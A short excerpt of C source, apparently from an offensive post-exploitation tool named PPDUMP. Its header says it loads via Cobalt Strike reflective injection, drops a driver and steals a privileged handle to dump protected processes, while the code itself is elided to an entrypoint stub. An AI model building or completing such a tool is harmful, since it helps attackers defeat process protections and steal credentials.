/**
 *
 * PPDUMP (Protected Process Dump) Utility.
 * Uses Cobalt Strike's Reflective Injection
 * capabilities to load itself into memory,
 * then begins loading the target driver,
 * and stealing a privileged handle.
 *
**/
...
VOID Entrypoint( _In_ DWORD ProcessId ) {
	...
	if ( DumpBufferToFile(szFileName, sz_amsdk, sizeof(sz_amsdk) - 1) ) {
